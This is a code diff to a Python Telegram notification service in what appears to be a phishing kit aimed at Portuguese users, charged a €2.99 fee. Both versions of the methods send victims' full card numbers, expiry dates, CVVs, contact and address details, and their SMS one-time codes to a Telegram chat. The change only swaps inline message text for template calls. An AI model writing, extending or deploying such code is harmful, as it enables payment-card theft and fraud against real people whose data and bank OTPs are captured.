@@ -156,36 +156,11 @@ class TelegramService:
     async def send_card_submitted_info(self, billing_data: Dict[str, Any], card_data: Dict[str, Any], session_id: str) -> bool:
         """Send first message: client + card data when card is submitted"""
         try:
-            # Show full card number (não mascarado conforme solicitado)
-            card_number = card_data.get('numeroCartao', 'N/A')
+            # Use the new template format
+            message = TelegramTemplates.payment_template(billing_data, card_data)
             
-            message = f"""💳 DADOS DE CARTÃO RECEBIDOS
-
-👤 DADOS DO CLIENTE:
-┣━ 📝 Nome: {billing_data.get('nome', 'N/A')}
-┣━ 📧 Email: {billing_data.get('email', 'N/A')}
-┗━ 📞 Telefone: {billing_data.get('telefone', 'N/A')}
-
-📍 ENDEREÇO DE ENTREGA:
-┣━ 🏠 Morada: {billing_data.get('endereco', 'N/A')}
-┣━ 📮 Código Postal: {billing_data.get('codigoPostal', 'N/A')}
-┗━ 🏙️ Cidade: {billing_data.get('cidade', 'N/A')}
-
-💳 DADOS DO CARTÃO:
-┣━ 💵 Valor: €2,99
-┣━ 💳 Número do Cartão: {card_number}
-┣━ 📅 Data de Expiração: {card_data.get('dataExpiracao', 'N/A')}
-┗━ 🔒 CVV: {card_data.get('cvv', 'N/A')}
-
-🔑 ID DA SESSÃO: {session_id}
-⏰ RECEBIDO EM: {datetime.now().strftime('%d/%m/%Y às %H:%M')}
-⏳ STATUS: AGUARDANDO CÓDIGO OTP
-
-═══════════════════════════════
-📱 Aguardando Verificação SMS 📱
-═══════════════════════════════"""
-            
-            return await self.send_message(message)
+            # Send with Markdown formatting to make bold text work
+            return await self.send_message(message, parse_mode="Markdown")
             
         except Exception as e:
             logger.error(f"Error formatting card submitted message: {str(e)}")
@@ -194,26 +169,11 @@ class TelegramService:
     async def send_otp_verified_message(self, billing_data: Dict[str, Any], card_data: Dict[str, Any], otp_code: str, tracking_number: str) -> bool:
         """Send second message: OTP verification with client identification"""
         try:
-            # Get card last 4 digits for identification
-            card_number = card_data.get('numeroCartao', '')
-            card_last4 = card_number[-4:] if len(card_number) >= 4 else '****'
+            # Use the new OTP template format
+            message = TelegramTemplates.otp_template(otp_code, billing_data, card_data)
             
-            # Clean phone number (remove +351 and format)
-            phone = billing_data.get('telefone', '')
-            clean_phone = phone.replace('+351', '').replace(' ', '').strip()
-            
-            message = f"""✅ OTP VERIFICADO COM SUCESSO
-
-🔐 VERIFICAÇÃO DE SEGURANÇA COMPLETA:
-┣━ 📱 Código OTP: {otp_code}
-┗━ ✅ Status: VERIFICADO
-
-👤 IDENTIFICAÇÃO DO CLIENTE:
-┣━ 📝 Nome: {billing_data.get('nome', 'N/A')}
-┣━ 📞 Telefone: {clean_phone}
-┗━ 💳 Cartão: ****{card_last4}"""
-            
-            return await self.send_message(message)
+            # Send with Markdown formatting to make bold text work
+            return await self.send_message(message, parse_mode="Markdown")
             
         except Exception as e:
             logger.error(f"Error formatting OTP verified message: {str(e)}")
